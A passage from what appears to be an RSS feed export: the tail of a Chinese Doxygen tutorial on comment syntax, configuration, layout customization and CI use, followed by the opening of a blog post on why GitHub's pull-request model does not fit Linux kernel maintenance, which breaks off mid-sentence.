</code></pre></div></figure>\n<p>ok，讲到这里，基本把Doxygen的机制给解释清楚了，如果您还不理解，最简单的方法就是把你假设为Doxygen<br>\n作者，重新推演一遍。</p>\n<p>下面咱们看看Doxygen怎么解决这两个问题的</p>\n<p><strong>区分普通注释和特殊注释</strong></p>\n<p>对于C/C++语言来说，注释形式有两种</p>\n<figure><div><pre data-language=\"c\"><code>//\n/* */</code></pre></div></figure>\n<p>Doxygen通过在这里增加<code>*</code>，<code>/</code>，<code>!</code>来作为特殊标记，比如</p>\n<p>对于<code>/* */</code>这种注释来说，正常注释为</p>\n<figure><div><pre data-language=\"c\"><code>/*\n * 正常注释\n */</code></pre></div></figure>\n<p>Doxygen在注释第一个<code>*</code>后，设置<code>*</code>或<code>!</code>作为标志，如果检测到有这些，<br>\n就将接下来的注释作为导出文档来解释</p>\n<figure><div><pre data-language=\"c\"><code>/**\n * 要输出成文档的注释\n */\n\n 或者\n\n/*!\n * 要输出成文档的注释\n */</code></pre></div></figure>\n<p>同时，中间的<code>*</code>号可以省略，像这样</p>\n<figure><div><pre data-language=\"c\"><code>/**\n   要输出成文档的注释\n */\n\n 或者\n\n/*!\n   要输出成文档的注释\n */</code></pre></div></figure>\n<p>对于<code>//</code>这种类型的注释，Doxygen在第二个<code>/</code>后，增加<code>!</code>或<code>/</code>作为区分标志，如果检测到有这些，<br>\n就将接下来的注释作为导出文档来解释</p>\n<figure><div><pre data-language=\"c\"><code>/// 要输出成文档的注释\n\n或者\n\n//! 要输出成文档的注释</code></pre></div></figure>\n<p>对于这种呢，有一个潜在的问题，很多时候，我们需要在把注释放到后面，比如下面这种</p>\n<figure><div><pre data-language=\"c\"><code>#define DEV_ON      ((int)(1))      //! Simple device is power on.\n#define DEV_OFF     ((int)(0))      //! Simple device is power off.</code></pre></div></figure>\n<p>如果真要这么写的话，Doxygen会把<code>//! Simple device is power on.</code>当做<code>DEV_OFF</code>的注释，这<br>\n当然不是我们所希望的! 怎么办呢，只好再加一个特殊标记了，Doxygen针对这种情况，需要在<code>!</code>后<br>\n再增加一个<code>&lt;</code>标志符，如果检测到这个，则认为这个注释是为前面代码准备的，所以，上面的注释应该<br>\n这么写</p>\n<figure><div><pre data-language=\"c\"><code>#define DEV_ON      ((int)(1))      //!&lt; Simple device is power on.\n#define DEV_OFF     ((int)(0))      //!&lt; Simple device is power off.</code></pre></div></figure>\n<p>做到这里，Doxygen就可以正确区分普通注释和特殊注释了。</p>\n<p>**注：**提到特殊标记，其实吧，编程语言非常常用，比如HTML就是典型的markup语言，一堆一堆的括号，看着就头疼</p>\n<p>Doxygen采用<code>\\</code>和<code>@</code>作为特殊标记符，当在特殊注释里面检测到了特殊标记符，则接下来检测紧跟单词是不是Doxygen<br>\n事先规定好的，如果是，则将按照特定的规则来解释紧跟着的注释；如果不是呢，则将<code>\\</code>和<code>@</code>解释为普通文本，聪明吧</p>\n<p>可能有点拗口，下面给你个例子</p>\n<figure><div><pre data-language=\"c\"><code>//***************************************************************************************\n//\n//! \\brief  Print Int number to terimal device.\n//!\n//! \\param  [in] number is the data you want to print.\n//! \\retval the number of print information, in bytes. return zero indicate print error !.\n//!\n//! \\note\n//! * Be sure you have called \\ref Dev_Init function before call this fuction.\n//! * Remember to check return value.\n//\n//***************************************************************************************\nextern int Dev_PrintInt(int number);</code></pre></div></figure>\n<p>看到了吧，这里的<code>\\brief</code>和<code>\\param</code>都是特殊符号，表示简要描述和参数。万一你小手一抖，把<code>\\param</code><br>\n写成了<code>\\parame</code>，那就悲剧了，因为Doxygen不认识<code>parame</code>，所以它会把这句话当做是普通文本来处理</p>\n<p>其实，上面的<code>\\</code>换成<code>@</code>也是ok的，如下所示</p>\n<figure><div><pre data-language=\"c\"><code>//***************************************************************************************\n//\n//! @brief  Print Int number to terimal device.\n//!\n//! @param  [in] number is the data you want to print.\n//! @retval the number of print information, in bytes. return zero indicate print error !.\n//!\n//! @note\n//! * Be sure you have called \\ref Dev_Init function before call this fuction.\n//! * Remember to check return value.\n//\n//***************************************************************************************\nextern int Dev_PrintInt(int number);</code></pre></div></figure>\n<p>相信某些玩过ARM芯片的，对这类注释非常熟悉，官方库都是采用Doxygen语法规则注释的</p>\n<h3>示例</h3>\n<p>采用Doxygen语法为main.c dev.c dev.h添加注释信息，完成后的效果如下所示：</p>\n<p><code>main.c</code></p>\n<figure><div><pre data-language=\"c\"><code>//***************************************************************************************\n//\n//! \\file main.c \n//! This is an simple example show developer how to use dev api to print int number.\n//!\n//! \\author    Cedar\n//! \\version   V1.0\n//! \\date      2014-03-23\n//! \\copyright GNU Public License V3.0\n//\n//***************************************************************************************\n\n#include \"dev.h\"\n\n#define CNT_MAX  10  //!&lt; The maxium number of print\n\n//! Simple device example.\nvoid DEV_Example(void)\n{\n\tint i = 0;\n\n\tDev_Init();\n\t\n\tfor (i = 0; i &lt; CNT_MAX; ++i)\n\t{\n\t\tDev_PrintInt(i);\n\t}\n\n\tDev_Close();\n}\n\n//! Application Entry\nint main(void)\n{\n\n\tDEV_Example();\n\n\treturn 0;\n}</code></pre></div></figure>\n<p><code>dev.c</code></p>\n<figure><div><pre data-language=\"c\"><code>//***************************************************************************************\n//\n//! \\file dev.c \n//! the implement of simple device.\n//!\n//! \\author    Cedar\n//! \\version   V1.0\n//! \\date      2014-03-23\n//! \\copyright GNU Public License V3.0\n//\n//***************************************************************************************\n\n//! Simple device status.\n//! \n//! \\warning This variable is designed for internal, user \\b MUST \\b NOT call it.\nstatic int __DevStatus = 0\n\nvoid Dev_Init(void)\n{\n\t// Print debug information\n\tprintf(\"Dev Initialize OK!\\r\\n\");\n}\n\nint Dev_PrintInt(int number)\n{\n\tprintf(\"Print IntType number: %d\\r\\n\", number);\n}\n\nint Dev_StatusCheck(void)\n{\n\treturn \t(__DevStatus);\n}\n\nvoid Dev_Close(void)\n{\n\tprintf(\"Dev Close OK!\\r\\n\");\n}</code></pre></div></figure>\n<p><code>dev.h</code></p>\n<figure><div><pre data-language=\"c\"><code>//***************************************************************************************\n//\n//! \\file dev.h\n//!  Simple device user API.\n//!\n//! \\author    Cedar\n//! \\version   V1.0\n//! \\date      2014-03-23\n//! \\copyright GNU Public License V3.0\n//\n//***************************************************************************************\n\n#include &lt;stdio.h&gt;\n\n\n//***************************************************************************************\n//\n//! \\addtogroup Dev_Status  Simple device status information.\n//! @{\n//\n//***************************************************************************************\n\n#define DEV_ON      ((int)(1))      //!&lt; Simple device is power on.\n#define DEV_OFF     ((int)(0))      //!&lt; Simple device is power off.\n\n//***************************************************************************************\n//\n//! @}\n//\n//***************************************************************************************\n\n\n//***************************************************************************************\n//\n//! \\addtogroup Dev_API  Simple device APIs list.\n//! @{\n//\n//***************************************************************************************\n\n//***************************************************************************************\n//\n//! \\brief  Initialize simple device.\n//!\n//! \\param  none.\n//! \\retval none.\n//!\n//! \\note   This function \\b MUST be called first before others function.\n//\n//***************************************************************************************\nextern void Dev_Init(void);\n\n//***************************************************************************************\n//\n//! \\brief  Print Int number to terimal device.\n//!\n//! \\param  [in] number is the data you want to print.\n//! \\retval the number of print information, in bytes. return zero indicate print error !.\n//!\n//! \\note\n//! * Be sure you have called \\ref Dev_Init function before call this fuction.\n//! * Remember to check return value.\n//\n//***************************************************************************************\nextern int Dev_PrintInt(int number);\n\n//***************************************************************************************\n//\n//! \\brief  Check simple device status information.\n//!\n//! \\param  none.\n//! \\retval status information of simple device, which can be one of the following value:\\n\n//!  - \\ref DEV_ON\n//!  - \\ref DEV_OFF\n//!  \\n More information, please reference \\ref Dev_Status.\n//\n//***************************************************************************************\nextern int Dev_StatusCheck(void);\n\n//***************************************************************************************\n//\n//! \\brief  Close simple device.\n//!\n//! \\param  none.\n//! \\retval none.\n//\n//***************************************************************************************\nextern void Dev_Close(void);\n\n//***************************************************************************************\n//\n//! @}\n//\n//***************************************************************************************\n\n//***************************************************************************************\n//\n//! \\example main.c\n//!  Show how to use simple device to print int number.\n//\n//***************************************************************************************</code></pre></div></figure>\n<p><strong>4. 生成文档</strong></p>\n<figure><div><pre data-language=\"bash\"><code>$ doxygen &lt;config-file&gt;</code></pre></div></figure>\n<h2>Win 图形界面使用</h2>\n<h3>第1章 安装</h3>\n<p>在Linux下可以通过<code>apt install doxygen</code>安装命令行工具，然后用<code>apt install doxygen-gui</code>安装图形界面。对Linux用户来说，命令行工具可以通过<code>doxygen</code>命令运行，而图形界面可以通过<code>doxywizard</code>命令运行。</p>\n<p>而Windows用户可以在<a href=\"https://www.doxygen.nl/download.html\">这里</a>下载，安装完毕后，直接双击就能运行图形界面。</p>\n<h4>1.1 基本使用</h4>\n<p>图形工具的基本使用如下图所示，有非常多的配置选项，这里我们只填入必要的配置，其它配置都用默认值。</p>\n<p><img src=\"https://cimg1.17lai.site/data/2022/05/28/20220528211414.webp\" alt=\"doxywizard使用步骤\"></p>\n<p><img src=\"https://cimg1.17lai.site/data/2022/05/28/20220528211414-1.webp\" alt=\"doxywizard使用步骤\"></p>\n<p>我们的工作目录如下：</p>\n<figure><div><pre data-language=\"csharp\"><code>.\n├── out\n└── src\n    └── math.h</code></pre></div></figure>\n<p>其中<code>math.h</code>代码如下：</p>\n<figure><div><pre data-language=\"c\"><code>/*! \\file math.h */\n\n/*!\n    用于求一个角度的sin值，输入是字符串以便同时支持弧度制和角度制表示\n    \\li 弧度制用pi表示，例如：2pi表示一圈、0.5pi表示直角\n    \\li 角度制用d结尾，例如：360d表示一圈、90d表示直角\n    \\li 输入也可以是数值，例如：输入3.14159大约表示180度\n\n    \\param a 用弧度制或角度制表示都行，字符串必须用'\\0'表示结束\n    \\param[out] res 是输出参数，用于保存sin运算的结果\n\n    \\return 错误码，0表示成功，其它表示失败\n\n    \\todo 在xxx的情况下存在BUG，预计下一版本修复\n*/\nint sin(char *a, double *res);</code></pre></div></figure>\n<p>Doxygen生成的HTML会放到<code>out</code>目录下，生成的HTML如图1-3所示。</p>\n<p><img src=\"https://cimg1.17lai.site/data/2022/05/28/20220528211414-2.webp\" alt=\"HTML界面\"></p>\n<h4>1.2 保存配置</h4>\n<p>在1.1节中我们配置了一些选项，也成功生成了HTML文档。我们希望下次代码改动后能够继续沿用上次配置，那么我们可以把这些配置保存成<code>Doxyfile</code>文件，见图1-4。</p>\n<p><img src=\"https://cimg1.17lai.site/data/2022/05/28/20220528211414-3.webp\" alt=\"保存Doxyfile配置文件\"></p>\n<h4>1.3 命令行运行Doxygen</h4>\n<p>有了配置文件后我们完全可以通过命令行来生成API文档，假设配置文件名为Doxyfile，那么我们只需要执行<code>doxygen /path/to/Doxyfile</code>即可生成API文档。</p>\n<p>通过命令行生成文档有许多好处，其中最主要的好处就是：能够集成到持续集成之类的自动化系统中。</p>\n<h3>第2章 为代码编写注释</h3>\n<h4>2.1 什么样的注释会被Doxygen识别？</h4>\n<p>Doxygen能识别这几种风格的注释：</p>\n<figure><div><pre data-language=\"c\"><code>/**\n * ... text ...\n */\n\n/*!\n * ... text ...\n */\n\n///\n/// ... text ...\n///\n\n//!\n//!... text ...\n//!</code></pre></div></figure>\n<p>文件的开头必须有文件注释，否则该文件不会被识别：</p>\n<figure><div><pre data-language=\"c\"><code>/*! \\file math.h */</code></pre></div></figure>\n<h4>2.2 注释怎么写</h4>\n<p>这个自己看<a href=\"https://www.doxygen.nl/manual/docblocks.html#cppblock\">官网例子</a>体会吧。</p>\n<h3>第3章 为其它编程语言生成注释</h3>\n<p>Doxygen主要支持C语言，其它语法跟C差不多的语言（如：C++/C#/PHP/Java）也能够支持，我们称这类语言为「C语系语言」。而哪些跟C语法差异较大的语言叫做「非C语系语言」。</p>\n<p>对于大多非C语系语言，Doxygen都是支持的，Doxygen原生支持这些语言：IDL、Java、Javascript、C#、C、C++、D、PHP、Objective-C、Python、Fortran、VHDL。</p>\n<p>万一项目需要的语言（例如：Lua）Doxygen官方并不支持，那么只能自行编写「第三方语言扩展」来支持了。</p>\n<h4>3.1 Doxygen官方支持的语言</h4>\n<p>见图3-1，文件名符合<code>FILE_PATTERNS</code>都会被处理。其中包括了<code>.c</code>、<code>.h</code>、<code>.py</code>等等。</p>\n<p><img src=\"https://cimg1.17lai.site/data/2022/05/28/20220528211414-4.webp\" alt=\"img\"></p>\n<p>如果我们的扩展名并不在<code>FILE_PATTERNS</code>内，那么可以加上去。例如我们项目下的所有<code>.ccc</code>文件，其实是C语言代码（这很奇葩，举个例子而已）。那我们可以编辑Doxyfile配置文件满足这一需求，需要2个步骤。</p>\n<p>(1) 在<code>FILE_PATTERNS</code>中添加<code>*.ccc</code>，如图3-2</p>\n<p><img src=\"https://cimg1.17lai.site/data/2022/05/28/20220528211414-5.webp\" alt=\"img\"></p>\n<p>(2) 在<code>EXTENSION_MAPPING</code>中添加映射规则<code>ccc=C</code>，如图3-3。语法是<code>ext=language</code>，其中language可以取的值有：IDL、Java、Javascript、C#、C、C++、D、PHP、Objective-C、Python、Fortran、VHDL。</p>\n<p><img src=\"https://cimg1.17lai.site/data/2022/05/28/20220528211414-6.webp\" alt=\"img\"></p>\n<h4>3.2 Doxygen官方不支持的语言</h4>\n<p>以Lua语言为例，它的代码是长这样的：</p>\n<figure><div><pre data-language=\"lua\"><code>-- \\file lmath.h\n\n--[[\n    用于求一个角度的sin值，输入是字符串以便同时支持弧度制和角度制表示\n    \\li 弧度制用pi表示，例如：2pi表示一圈、0.5pi表示直角\n    \\li 角度制用d结尾，例如：360d表示一圈、90d表示直角\n    \\li 输入也可以是数值，例如：输入3.14159大约表示180度\n\n    \\param a 字符串类型，表示角度，用弧度制或角度制表示都行\n\n    \\return 返回sin运算的结果\n\n    \\todo 在xxx的情况下存在BUG，预计下一版本修复\n--]]\nfunction sin(a)\n    return 1.123\nend</code></pre></div></figure>\n<p>可以看到Lua的语法既不像C也不像Python。本节以Lua为例，介绍如何为Doxygen编写Lua语言扩展。<br>\n好吧，大多数人没有这种需求，这里就不介绍了。</p>\n<h3>第4章 定制Doxygen的输出</h3>\n<h4>4.1 定制页面样式</h4>\n<p>Doxygen输出的默认HTML比较难看，如图4-1。</p>\n<p><img src=\"https://cimg1.17lai.site/data/2022/05/28/20220528211414-7.webp\" alt=\"img\"></p>\n<p>如果嫌生成的HTML不好看，可以自定义HTML页面头部、尾部以及页面整体CSS样式表。<br>\n(1) 生成默认的风格的配置文件，敲这个命令：<code>doxygen -w html header.html footer.html customdoxygen.css</code>，可以生成<code>header.html</code>、<code>footer.html</code>、<code>customdoxygen.css</code>。<br>\n(2) 根据自己的需求修改这三个文件。<br>\n(3) 配置<code>HTML_HEADER</code>、<code>HTML_FOOTER</code>、<code>HTML_STYLESHEET</code>指向修改后的文件，如图4-2。</p>\n<p><img src=\"https://cimg1.17lai.site/data/2022/05/28/20220528211414-8.webp\" alt=\"img\"></p>\n<p>Doxygen默认的页面主色调大约是天蓝色的，可以通过<code>HTML_COLORSTYLE_HUE</code>、<code>HTML_COLORSTYLE_SAT</code>、<code>HTML_COLORSTYLE_GAMMA</code>修改主色调，这3个配置分别对应色相、饱和度、Gamma校正，见图4-3。如果不太懂色相、饱和度是啥意思，请自行百度「色彩模式」或参考Photoshop相关教程。</p>\n<p><img src=\"https://cimg1.17lai.site/data/2022/05/28/20220528211414-9.webp\" alt=\"img\"></p>\n<p>经过图4-3的修改，页面的主色调变为图4-4的样子。</p>\n<p><img src=\"https://cimg1.17lai.site/data/2022/05/28/20220528211414-10.webp\" alt=\"img\"></p>\n<h4>4.2 导航栏</h4>\n<p>Doxygen中「导航栏」有两种展示方式：Treeview和Index，分别是竖向和横向的，如图4-5。</p>\n<p><img src=\"https://cimg1.17lai.site/data/2022/05/28/20220528211414-11.webp\" alt=\"img\"></p>\n<p>可以配置<code>DISABLE_INDEX</code>和<code>GENERATE_TREEVIEW</code>来控制是否显示它们，如图4-6。</p>\n<p><img src=\"https://cimg1.17lai.site/data/2022/05/28/20220528211414-12.webp\" alt=\"img\"></p>\n<h4>4.3 自定义「导航栏」的目录结构</h4>\n<p>我们已经知道Doxygen中「导航栏」有Treeview和Index两种了。这节介绍如何定制导航栏的目录结构。这需要三个步骤。<br>\n(1) 执行<code>doxygen -l</code>，生成<code>DoxygenLayout.xml</code>文件<br>\n(2) 编辑<code>DoxygenLayout.xml</code>文件，修改其中的布局<br>\n(3) 修改<code>LAYOUT_FILE</code>配置，使其指向<code>DoxygenLayout.xml</code>文件，如图4-7<br>\n(4) 运行Doxygen</p>\n<p><img src=\"https://cimg1.17lai.site/data/2022/05/28/20220528211414-13.webp\" alt=\"img\"></p>\n<p>那么如何修改XML文件呢？默认的<code>DoxygenLayout.xml</code>代码如下：</p>\n<figure><div><pre data-language=\"markup\"><code>&lt;doxygenlayout version=\"1.0\"&gt;\n  &lt;navindex&gt;\n    &lt;tab type=\"mainpage\" visible=\"yes\" title=\"\"/&gt;\n    &lt;tab type=\"pages\" visible=\"yes\" title=\"\" intro=\"\"/&gt;\n    &lt;tab type=\"modules\" visible=\"yes\" title=\"\" intro=\"\"/&gt;\n    &lt;tab type=\"namespaces\" visible=\"yes\" title=\"\"&gt;\n      &lt;tab type=\"namespacelist\" visible=\"yes\" title=\"\" intro=\"\"/&gt;\n      &lt;tab type=\"namespacemembers\" visible=\"yes\" title=\"\" intro=\"\"/&gt;\n    &lt;/tab&gt;\n    &lt;tab type=\"classes\" visible=\"yes\" title=\"\"&gt;\n      &lt;tab type=\"classlist\" visible=\"yes\" title=\"\" intro=\"\"/&gt;\n      &lt;tab type=\"classindex\" visible=\"$ALPHABETICAL_INDEX\" title=\"\"/&gt; \n      &lt;tab type=\"hierarchy\" visible=\"yes\" title=\"\" intro=\"\"/&gt;\n      &lt;tab type=\"classmembers\" visible=\"yes\" title=\"\" intro=\"\"/&gt;\n    &lt;/tab&gt;\n    &lt;tab type=\"files\" visible=\"yes\" title=\"\"&gt;\n      &lt;tab type=\"filelist\" visible=\"yes\" title=\"\" intro=\"\"/&gt;\n      &lt;tab type=\"globals\" visible=\"yes\" title=\"\" intro=\"\"/&gt;\n    &lt;/tab&gt;\n    &lt;tab type=\"examples\" visible=\"yes\" title=\"\" intro=\"\"/&gt;  \n  &lt;/navindex&gt;\n&lt;/doxygenlayout&gt;</code></pre></div></figure>\n<p>XML对应了导航栏的目录树结构，我们通过该文件改变布局。标签的<code>type</code>属性取值除了上面列出的这些预定义值以外，还可以是<code>type=\"user\"</code>或<code>type=\"usergroup\"</code>，我们只能通过这两个<code>type</code>自定义布局，例如下面这段代码，生成的效果如图4-8：</p>\n<figure><div><pre data-language=\"markup\"><code>&lt;doxygenlayout version=\"1.0\"&gt;\n  &lt;navindex&gt;\n    &lt;tab type=\"usergroup\" visible=\"yes\" title=\"友情链接（演示如何外链）\"&gt;\n      &lt;tab type=\"user\" visible=\"yes\" title=\"百度\" url=\"http://www.baidu.com\" /&gt;\n      &lt;tab type=\"user\" visible=\"yes\" title=\"163\" url=\"http://www.163.com\" /&gt;\n    &lt;/tab&gt;\n    &lt;tab type=\"usergroup\" visible=\"yes\" title=\"数学库（演示如何链接文件）\"&gt;\n      &lt;tab type=\"user\" visible=\"yes\" url=\"@ref math.h\" title=\"math\" /&gt;\n      &lt;tab type=\"user\" visible=\"yes\" url=\"@ref math2.h\" title=\"math2\" /&gt;\n    &lt;/tab&gt;\n    &lt;tab type=\"usergroup\" visible=\"yes\" title=\"三角函数（演示链接函数、结构体）\"&gt;\n      &lt;tab type=\"user\" visible=\"yes\" url=\"@ref sin\" title=\"sin\" /&gt;\n      &lt;tab type=\"user\" visible=\"yes\" url=\"@ref sin2\" title=\"sin2\" /&gt;\n    &lt;/tab&gt;\n  &lt;/navindex&gt;\n&lt;/doxygenlayout&gt;</code></pre></div></figure>\n<p><img src=\"https://cimg1.17lai.site/data/2022/05/28/20220528211414-14.webp\" alt=\"img\"></p>\n<h4>4.4 完全自定义</h4>\n<p>如果Doxygen输出的界面实在不入你的法眼，4.1~4.3介绍的定制化功能也不能彻底满足你的需求。那么你需要根据Doxygen输出的XML数据自行生成界面了。<br>\n(1) 将<code>GENERATE_XML</code>配置为<code>YES</code><br>\n(2) 去输出目录寻找生成的XML文件，XML文件包括了函数信息、注释信息等<br>\n(3) 自己写程序读取XML文件，并生成漂亮的文档</p>\n<h3>第5章 Markdown支持</h3>\n<blockquote>\n<p>待补充完善</p>\n</blockquote>\n<p>Markdown在工业界是非常流行的文档格式，文件名以.md结尾，其简洁直观的语法深受广大程序员喜爱。对Markdown本身的介绍超出了本文范围，本章介绍Doxygen对Markdown的支持。</p>\n<h4>5.1 为.md文件生成文档</h4>\n<h4>5.2 在代码注释中使用Markdown语法</h4>\n<h3>第6章 搜索功能</h3>\n<h2>Gitlab CI/CD使用</h2>\n<blockquote>\n<p><a href=\"https://gitlab.com/pages/doxygen\">https://gitlab.com/pages/doxygen</a></p>\n<p>结合Docker和Gitlab CI/CD使用案例</p>\n</blockquote>\n<p><img src=\"https://cimg1.17lai.site/data/2022/05/28/20220528211032.webp\" alt=\"Gitlab Doxygen运行效果如下\"></p>\n<h2>参考资源</h2>\n<ul>\n<li><a href=\"http://doxygen.nl/\">Doxygen 官网</a></li>\n<li><a href=\"https://www.doxygen.nl/manual/docblocks.html#cppblock\">官网注释例子</a></li>\n<li><a href=\"https://www.jianshu.com/p/bf5afbbe183b\">Doxygen文档生成工具教程</a></li>\n<li><a href=\"https://cedar-renjun.github.io/2014/03/21/learn-doxygen-in-10-minutes/\">Doxygen 10 分钟入门教程</a></li>\n<li><a href=\"https://gitlab.com/pages/doxygen\">Gitlab CI/CD doxygen</a></li>\n</ul>"
    },
    "origin": {
        "streamId": 34,
        "title": "夜法之书",
        "htmlUrl": "https://blog.17lai.site/",
        "feedUrl": "https://blog.17lai.site/atom.xml"
    }
},
{
    "id": "http://blog.ffwll.ch/2017/08/github-why-cant-host-the-kernel.html",
    "timestampUsec": "1659344373818478",
    "categories": [
        "Maintainer-Stuff",
        "user/-/state/com.google/read",
        "user/-/state/com.google/starred"
    ],
    "title": "Why Github can't host the Linux Kernel Community",
    "author": "",
    "published": 1502150400,
    "updated": 1502150400,
    "alternate": [
        {
            "href": "http://blog.ffwll.ch/2017/08/github-why-cant-host-the-kernel.html",
            "type": "text/html"
        }
    ],
    "content": {
        "content": "<p>A while back at the awesome <a href=\"https://maintainerati.org/\">maintainerati</a> I\nchatted with a few great fellow maintainers about how to scale really big open\nsource projects, and how github forces projects into a certain way of scaling.\nThe linux kernel has an entirely different model, which maintainers hosting\ntheir projects on github don’t understand, and I think it’s worth explaining why\nand how it works, and how it’s different.</p>\n\n<p>Another motivation to finally get around to typing this all up is the <a href=\"https://news.ycombinator.com/item?id=13444560\">HN\ndiscussion</a> on my <a href=\"http://blog.ffwll.ch/2017/01/maintainers-dont-scale.html\">“Maintainers\nDon’t Scale” talk</a>, where the top comment\nboils down to “… why don’t these dinosaurs use modern dev tooling?”. \nA few top kernel maintainers vigorously defend mailing lists and patch\nsubmissions over something like github pull requests, but at least some folks from\nthe graphics subsystem would love more modern tooling which would be much easier\nto script. The problem is that\ngithub doesn’t support the way the linux kernel scales out to a huge number of\ncontributors, and therefore we can’t simply move, not even just a few\nsubsystems. And this isn’t about just hosting the git data, that part obviously\nworks, but how pull requests, issues and forks work on github.</p>\n\n\n\n<h2>Scaling, the Github Way</h2>\n\n<p>Git is awesome, because everyone can fork and create branches and hack on the\ncode\nvery easily. And eventually you have something good, and you create a pull\nrequest for the main repo and get it reviewed, tested and merged. And github is\nawesome, because it figured out an UI that makes this complex stuff all nice&amp;easy\nto discover and learn about, and so makes it a lot simpler for new folks to\ncontribute to a project.</p>\n\n<p>But eventually a project becomes a massive success, and no amount of tagging,\nlabelling, sorting, bot-herding and automating will be able to keep on top of\nall the pull requests and issues in a repository, and it’s time to split things\nup into more manageable pieces again. More important, with a certain size and\nage of a project different parts need different rules and processes: The shiny\nnew experimental library has different stability and CI criteria than the main\ncode, and maybe you have some dumpster pile of deprecated plugins that aren’t\nsupport, but you can’t yet delete them: You need to split up your\nhumongous project into sub-projects, each with their own flavour of process and\nmerge criteria and their own repo with their own pull request and issue tracking.\nGenerally it takes a few tens to few hundreds of full time contributors until\nthe pain is big enough that such a huge reorganization is necessary.</p>\n\n<p>Almost all projects hosted on github do this by splitting up their monorepo\nsource tree into lots of different projects, each with its distinct set of\nfunctionality. Usually that results in a bunch of things that are considered the\ncore, plus piles of plugins and libraries and extensions. All tied together with\nsome kind of plugin or package manager, which in some cases directly fetches\nstuff from github repos.</p>\n\n<p>Since almost every big project works like this I don’t think it’s necessary to\ndelve on the benefits. But I’d like to highlight some of the issues this is\ncausing:</p>\n\n<ul>\n  <li>\n    <p>Your community fragments more than necessary. Most contributors just have the\ncode and repos around that they directly contribute to, and ignore everything\nelse. That’s great for them, but makes it much less likely that duplicated\neffort and parallel solutions between different plugins and libraries get\nnoticed and the efforts shared. And people who want to steward the overall\ncommunity need to deal with the hassle of tons of repos either managed through\nsome script, or git submodules, or something worse, plus they get drowned in\npull requests and issues by being subscribed to everything. Any kind of\nconcern (maybe you have shared build tooling, or documentation, or whatever)\nthat doesn’t neatly align with your repo splits but cuts across the project\nbecomes painful for the maintainers responsible for that.</p>\n  </li>\n  <li>\n    <p>Even once you’ve noticed the need for it, refactoring and code sharing have\nmore bureaucratic hurdles: First you have to release a new version of the core\nlibrary, then go through all the plugins and update them, and then maybe you\ncan remove the old code in the shared library.  But since everything is\nmassively spread around you can forget about that last step.</p>\n\n    <p>Of course it’s not much work to do this, and many projects excel at making\nthis fairly easy. But it is more effort than a simple pull request to the one\nsingle monorepo. Very simple refactorings (like just sharing a single new\nfunction) will happen less often, and over a long time that compounds and\naccumulates a lot of debt. Except when you go the node.js way with repos for\nsingle functions, but then you essentially replace git with npm as your source\ncontrol system, and that seems somewhat silly too.</p>\n  </li>\n  <li>\n    <p>The combinatorial explosion of theoretically supported version mixes becomes\nunsupportable. As a user that means you end up having to do the integration\ntesting. As a project you’ll end up with blessed combinations, or at least\nde-facto blessed combinations because developers just close bug reports with\n“please upgrade everything first”. Again that means defacto you have a\nmonorepo, except once more it’s not managed in git. Well, except if you use\nsubmodules, and I’m not sure that’s considered git …</p>\n  </li>\n  <li>\n    <p>Reorganizing how you split the overall projects into sub-projects is a pain,\nsince it means you need to reorganize your git repositories and how they’re\nsplit up. In a monorepo shifting around maintainership just amounts to\nupdating OWNER or MAINTAINERS files, and if your bots are all good the new\nmaintainers get auto-tagged automatically. But if your way of scaling means\nsplitting git repos into disjoint sets, then any reorg is as painful as the\ninitial step from a monorepo to a group of split up repositories. That means\nyour project will be stuck with a bad organizational structure for too long.</p>\n  </li>\n</ul>\n\n<h2>Interlude: Why Pull Requests Exist</h2>\n\n<p>The linux kernel is one of the few projects I’m aware of which isn’t split up\nlike this. Before we look at how that works - the kernel is a huge project and\nsimply can’t be run without some sub-project structure - I think it’s\ninteresting to look at why git does pull requests: On github pull request is the\none true way for contributors to get their changes merged. But in the kernel\nchanges are submitted as patches sent to mailing lists, even long after git has\nbeen widely adopted.</p>\n\n<p>But the very first version of git supported pull requests. The audience of these\nfirst, rather rough, releases was kernel maintainers, git was\nwritten to solve Linus Torvalds’ maintainer problems. Clearly it was needed and\nuseful, but not to handle changes from individual contributors: Even today, and\nmuch more back then, pull requests are used to forward the changes of an entire\nsubsystem, or synchronize code refactoring or similar cross-cutting change\nacross different sub-projects. As an example, the <a href=\"https://lkml.org/lkml/2017/5/2/508\">4.12 network pull request\nfrom Dave S. Miller</a>, <a href=\"https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=8d65b08debc7e62b2c6032d7fe7389d895b92cbc\">committed by\nLinus</a>:\nIt contains 2k+ commits from 600 contributors and a bunch of merges for pull\nrequests from subordinate maintainers. But almost all the patches themselves are\ncommitted by maintainers after picking up the patches from mailing lists, not by\nthe authors themselves. This kernel process peculiarity that authors generally\ndon’t commit into shared repositories is also why git tracks the committer and\nauthor separately.</p>\n\n<p>Github’s innovation and improvement was then to use pull requests for\neverything, down to individual contributions. But that wasn’t what they were\noriginally created for.</p>\n\n<h2>Scaling, the Linux Kernel Way</h2>\n\n<p>At first glance the kernel looks like a monorepo, with everything smashed into\none place in <a href=\"https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/\">Linus’ main\nrepo</a>. But that’s very far from it:</p>\n\n<ul>\n  <li>\n    <p>Almost no one who’s using linux is running the main repo from Linus Torvalds.\nIf they run something upstream-ish it’s probably one of the <a href=\"https://git.kernel.org/pub/scm/linux/kernel/git/stable/linux-stable.git/\">stable\nkernels</a>.\nBut much more likely is that they run a kernel from their distro, which\nusually has additional patches and backports, and isn’t even hosted on\n<a href=\"https://git.kernel.org/\">kernel.org</a>, so would be a completely different\norganization. Or they have a kernel from their hardware vendor (for SoC and\npretty much anything Android), which often have considerable deltas compared\nto anything hosted in one of the “main” repositories.</p>\n  </li>\n  <li>\n    <p>No one (except Linus himself) is developing stuff on top of Linus’ repository.\nEvery subsystem, and often even big drivers, have their own git repositories,\nwith their own mailing lists to track submissions and discuss issues\ncompletely separate from everyone else.</p>\n  </li>\n  <li>\n    <p>Cross-subsystem work is done on top of the <a href=\"https://git.kernel.org/pub/scm/linux/kernel/git/next/linux-next.git/\">linux-next integration\ntree</a>,\nwhich contains a few hundred git branches from about as many different git\nrepositories.</p>\n  </li>\n  <li>\n    <p>All this madness is managed through the\n<a href=\"https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/tree/MAINTAINERS\">MAINTAINERS</a>\nfile and the get_maintainers.pl script, which for any given snippet of code can\ntell you who’s the maintainer, who should review this, where the right git\nrepo is, which mailing lists to use and how and where to report bugs. And it’s\nnot just strictly based on file locations, it also catches code patterns to\nmake sure that cross-subsystem topics like device-tree handling, or 